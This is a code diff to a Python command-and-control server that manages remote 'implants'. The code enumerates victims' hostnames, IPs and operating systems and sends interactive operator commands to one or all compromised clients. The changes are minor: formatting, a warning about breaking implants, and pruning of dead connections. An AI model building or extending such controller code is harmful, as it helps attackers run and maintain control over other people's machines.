@@ -111,8 +111,8 @@ class C2Server:
             for index, client in enumerate(self.clients):
                 self.select_client(index)
                 client_data = [self.send_command('python -c "import platform; print(platform.node())"')]  #Hostname
-                client_data.append(client.getpeername()[0]),                                              #Ip
-                client_data = list(client_data)                                     
+                client_data.append(client.getpeername()[0]),                                               #Ip
+                client_data = list(client_data)
                 client_data.append(self.send_command('python -c "import os; print(os.name)"'))            #OS
                 if client_data[2] == "nt":
                     client_data[2] = "Windows"
@@ -145,11 +145,14 @@ if __name__ == "__main__":
         runstatus = log.waitfor(f"Interactive mode | enter 'return' to quit | STATUS = ", status = "Commanding")
         while run_interactive:
             command = str_input('C2> ')
+            if command == "exit":
+                log.warning("Exit breaks implants, use 'return' to quit [No Commands Sent]")
             if command == "return":
-                    run_interactive = False
-                    log.info("Returning...\n")
+                run_interactive = False
+                log.info("Returning...\n")
             else:
                 if sendall:
+                    server.remove_dead()
                     for i in range(len(server.clients)):
                         server.select_client(i)
                         if operating_system is not None and server.send_command('python -c "import os; print(os.name)"') != operating_system:
@@ -183,7 +186,7 @@ if __name__ == "__main__":
         elif choice == 1: 	 #List Clients
             client_list = server.list_clients()
             if len(client_list) > 0:
-                log.info("[ Hostname, IP, Port, OS ]")
+                log.info("[ Hostname, IP, OS ]")
                 for client_data in client_list:
                     log.info(client_data)
 
